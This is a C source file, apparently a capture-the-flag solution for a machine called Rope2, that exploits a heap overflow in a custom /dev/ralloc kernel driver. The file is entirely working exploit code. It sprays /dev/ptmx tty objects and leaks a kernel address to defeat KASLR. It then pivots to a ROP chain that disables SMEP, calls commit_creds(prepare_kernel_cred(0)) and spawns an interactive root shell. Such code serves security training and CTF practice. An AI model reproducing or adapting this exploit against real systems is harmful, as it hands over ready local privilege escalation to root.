#define _GNU_SOURCE
#include <stdio.h>
#include <unistd.h>
#include <sys/ioctl.h>
#include <sys/types.h>
#include <sys/stat.h>
#include <fcntl.h>
#include <string.h>
#include <stdlib.h>
#include <sched.h>
#include <sys/mman.h>
#include <sys/ipc.h>
#include <sys/sem.h>


struct rope {
	long 	index;
	long 	size;
	char 	*buf;
};

struct rope 	r;
int				fd;

int set_cpu0()
{
	cpu_set_t	myset;
	CPU_ZERO(&myset);
	CPU_SET(0, &myset);

	if(sched_setaffinity(0, sizeof(myset), &myset) != 0)
	{
		printf("   - Unable to attach to cpu0\n");
		exit(0);
	}

	return 0;
}

int rope_add(unsigned long size, unsigned long index)
{
	r.size = size;
	r.index = index;

	return ioctl(fd, 0x1000, &r);
}

int rope_rm(unsigned long index)
{
	r.index = index;

	return ioctl(fd, 0x1001, &r);
}

int rope_write(unsigned long size, unsigned long index, char *buf)
{
	r.size = size;
	r.index = index;
	r.buf = buf;

	return ioctl(fd, 0x1002, &r);
}

int rope_read(unsigned long size, unsigned long index, char *buf)
{
	r.size = size;
	r.index = index;
	r.buf = buf;

	return ioctl(fd, 0x1003, &r);
}


/* status */
unsigned long user_cs, user_ss, user_eflags;
void save_stats() {
    asm(
            "movq %%cs, %0\n"
            "movq %%ss, %1\n"
            "pushfq\n"
            "popq %2\n"
            :"=r"(user_cs), "=r"(user_ss), "=r"(user_eflags)
            :
            : "memory"
            );
}


unsigned long base = 0x00;

#define COMMIT_CREDS base - 0xfef160
#define PREPARE_KERNEL_CRED base - 0xfeef00
typedef unsigned long __attribute__((regparm(3))) (*_commit_creds)(unsigned long cred);
typedef unsigned long __attribute__((regparm(3))) (*_prepare_kernel_cred)(unsigned long cred);

void shellcode(void) {
	((_commit_creds)(COMMIT_CREDS))(
	    ((_prepare_kernel_cred)(PREPARE_KERNEL_CRED))(0));
}

void run_shell()
{	
	char* shell = "/bin/bash";
	char* args[] = {shell, "-i", NULL};
	execve(shell, args, NULL);
}


int main(void)
{
	unsigned long poprdi = -0x1023e00;
	unsigned long movcr4 = -0x108fa60;
	unsigned long swapgs = -0x103ab4c;
	unsigned long iretq	= -0x1077ca5;

	void *fake_tty_operations[40];
	unsigned long ptm_unix98_ops_offset = 0xaf560;
	unsigned long xchg_esp_eax_offset =  -0xf2e119;
	unsigned long xchg_esp_eax = 0x00;
	unsigned long long leak[128+4];

	printf("[*] Rope2 kernel heap overflow (smep/kaslr) by gbrsh\n");

	set_cpu0();


	fd = open("/dev/ralloc", O_RDONLY);
	if(fd == -1)
	{
		printf("   - Cannot open /dev/ralloc file\n");
		exit(0);
	}

	printf("   + spraying the heap...\n");
	int tfds[234];
	for(int i = 0; i < 234; i++)
	{
		tfds[i] = open("/dev/ptmx", O_RDONLY);
	}


	rope_rm(0);
	rope_add(0x400, 0);
	int tty_fd = open("/dev/ptmx", O_RDONLY);

	char *buf = malloc(0x400 + 0x20);
	rope_read(0x400+0x20, 0, buf);

	printf("   + leaking kernel address...\n");
	memcpy(leak, buf, 0x400 + 0x20);

	// printf("? : \n");
	// for(int i = 0; i < 4; i++)
	// 	printf("%p\n", (void *)leak[128 + i]);

	if(leak[128] == 0x100005401)
	{
		if((leak[131] & 0xff) == 0x60)
		{
			printf("      - useless address leaked... please run the exploit again!\n");
			exit(1);
		}
		printf("      + good leak verified\n");

		unsigned long kleak = leak[131];
	 	base = kleak;
	 	xchg_esp_eax = base + xchg_esp_eax_offset;
	 	printf("   + xchg gadged at: %p\n", (void *)xchg_esp_eax);

	 	printf("   + commit_creds at: %p\n", (void *)COMMIT_CREDS);
	 	printf("   + prepare_kernel_cred at: %p\n", (void *)PREPARE_KERNEL_CRED);

		unsigned long lower_address = xchg_esp_eax & 0xffffffff;
	 	unsigned long stack_base = lower_address & ~0xfff;
	 	printf("   + allocating fake stack at: %p\n", (void *)stack_base);

	 	if(mmap((void *)stack_base, 0x30000, 7, MAP_PRIVATE | MAP_ANONYMOUS, -1 ,0) != (void *)stack_base)
	 	{
	 		printf("      - unable to mmap\n");
	 		exit(1);
	 	}

	 	unsigned long tmp_stack = 0x13370000;
	 	if(mmap((void *)tmp_stack, 0x30000, 7, MAP_PRIVATE | MAP_ANONYMOUS, -1 ,0) != (void *)tmp_stack)
	 	{
	 		printf("      - unable to mmap\n");
	 		exit(1);
	 	}
	 	memset((void *)tmp_stack, 0x00, 0x3000);

	 	printf("   + saving user state\n");
		save_stats();

		unsigned long rop_chain [] = {
	 		base + poprdi,
	 		0x406f0,
	 		base + movcr4,
	 		0x00,
	 		(unsigned long)shellcode,
	 		base + swapgs,
	 		0x00,
	 		base + iretq,
	 		(unsigned long)run_shell,
	 		user_cs,
	 		user_eflags,
	 		tmp_stack + 0x1000,
	 		user_ss
	 	};


	 	memcpy((void *)lower_address, rop_chain, sizeof(rop_chain));


		for(int i = 0; i < 40; i++)
	    {
	        fake_tty_operations[i] = (void *)xchg_esp_eax;
	    }



		leak[128 + 3] = (unsigned long long)fake_tty_operations;
		memcpy(buf, leak, 0x400 + 0x20);

		rope_write(0x400 + 0x20, 0, buf);

		printf("   + triggering!!!\n\n\n");
		ioctl(tty_fd, 0, 0);
		for(int i = 0; i < 234; i++)
			ioctl(tfds[i], 0, 0);

	}
	else
	{
		printf("      - useless address leaked... please run the exploit again!\n");
		exit(1);
	}


	return 0;
}
